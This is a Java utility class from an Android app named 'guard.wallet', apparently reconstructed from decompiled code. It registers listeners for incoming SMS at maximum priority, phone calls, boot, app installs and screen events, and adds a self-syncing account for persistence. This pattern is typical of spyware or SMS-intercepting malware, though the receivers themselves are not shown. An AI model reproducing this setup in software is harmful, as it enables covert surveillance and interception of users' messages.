package com.guard.wallet.utils;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.IntentFilter;
import android.util.Log;

/**
 * 广播接收器注册工具类 — 批量注册各种系统广播监听。
 * vendor g.d()/b1()/c1()/e1()/h1()/i1()/j1()/k1()/l1()/m1()/n1()
 */
public final class ReceiverRegistrar {
    private static final String TAG = "ReceiverRegistrar";

    private ReceiverRegistrar() {}

    private static Context ctx() { return AppManagerUtils.getContext(); }

    /** g.d() — 注册同步账户（被引用 773 次的核心方法）*/
    public static void registerSyncAccount() {
        Context context = ctx();
        if (context == null) return;
        try {
            AccountManager am = AccountManager.get(context);
            String accountType = context.getPackageName();
            Account account = new Account(accountType, accountType);
            if (am.addAccountExplicitly(account, null, null)) {
                ContentResolver.setIsSyncable(account, accountType, 1);
                ContentResolver.setSyncAutomatically(account, accountType, true);
                ContentResolver.addPeriodicSync(account, accountType, android.os.Bundle.EMPTY, 3600L);
                Log.d(TAG, "同步账户注册成功");
            }
        } catch (Exception e) {
            Log.e(TAG, "registerSyncAccount error", e);
        }
    }

    private static void registerReceiver(String action, android.content.BroadcastReceiver receiver) {
        Context context = ctx();
        if (context == null) return;
        try {
            IntentFilter filter = new IntentFilter(action);
            context.registerReceiver(receiver, filter);
        } catch (Exception e) {
            Log.e(TAG, "registerReceiver error: " + action, e);
        }
    }

    /** g.b1() — 注册电池监听 */
    public static void registerBatteryReceiver() {
        registerReceiver("android.intent.action.BATTERY_CHANGED",
                new com.guard.wallet.receiver.BatteryLevelReceiver());
    }

    /** g.e1() — 注册通话监听 */
    public static void registerCallReceiver() {
        registerReceiver("android.intent.action.PHONE_STATE",
                new com.guard.wallet.receiver.CallReceiver());
    }

    /** g.h1() — 注册网络变化监听 */
    public static void registerNetworkReceiver() {
        Context context = ctx();
        if (context == null) return;
        try {
            IntentFilter filter = new IntentFilter();
            filter.addAction("android.net.conn.CONNECTIVITY_CHANGE");
            filter.addAction("android.net.wifi.WIFI_STATE_CHANGED");
            filter.addAction("android.net.wifi.STATE_CHANGE");
            context.registerReceiver(new com.guard.wallet.receiver.NetWorkReceiver(), filter);
        } catch (Exception e) {
            Log.e(TAG, "registerNetworkReceiver error", e);
        }
    }

    /** g.k1() — 注册屏幕亮灭监听 */
    public static void registerScreenReceiver() {
        Context context = ctx();
        if (context == null) return;
        try {
            IntentFilter filter = new IntentFilter();
            filter.addAction("android.intent.action.SCREEN_ON");
            filter.addAction("android.intent.action.SCREEN_OFF");
            filter.addAction("android.intent.action.USER_PRESENT");
            context.registerReceiver(new com.guard.wallet.receiver.ScreenBroadcastReceiver(), filter);
        } catch (Exception e) {
            Log.e(TAG, "registerScreenReceiver error", e);
        }
    }

    /** g.j1() — 注册电源状态监听 */
    public static void registerPowerReceiver() {
        registerReceiver("android.intent.action.ACTION_POWER_CONNECTED",
                new com.guard.wallet.receiver.PowerBroadcastReceiver());
    }

    /** g.l1() — 注册关机监听 */
    public static void registerShutdownReceiver() {
        registerReceiver("android.intent.action.ACTION_SHUTDOWN",
                new com.guard.wallet.receiver.ShutDownBroadcastReceiver());
    }

    /** g.m1() — 注册应用安装/卸载监听 */
    public static void registerPackageReceiver() {
        Context context = ctx();
        if (context == null) return;
        try {
            IntentFilter filter = new IntentFilter();
            filter.addAction("android.intent.action.PACKAGE_ADDED");
            filter.addAction("android.intent.action.PACKAGE_REMOVED");
            filter.addDataScheme("package");
            context.registerReceiver(new com.guard.wallet.receiver.PackageReceiver(), filter);
        } catch (Exception e) {
            Log.e(TAG, "registerPackageReceiver error", e);
        }
    }

    /** g.c1() — 注册开机广播监听 */
    public static void registerBootReceiver() {
        registerReceiver("android.intent.action.BOOT_COMPLETED",
                new com.guard.wallet.receiver.BootBroadcast());
    }

    /** g.i1() — 注册短信监听 */
    public static void registerSmsReceiver() {
        Context context = ctx();
        if (context == null) return;
        try {
            IntentFilter filter = new IntentFilter();
            filter.addAction("android.provider.Telephony.SMS_RECEIVED");
            filter.setPriority(Integer.MAX_VALUE);
            context.registerReceiver(new com.guard.wallet.receiver.SmsReceiver(), filter);
        } catch (Exception e) {
            Log.e(TAG, "registerSmsReceiver error", e);
        }
    }
}
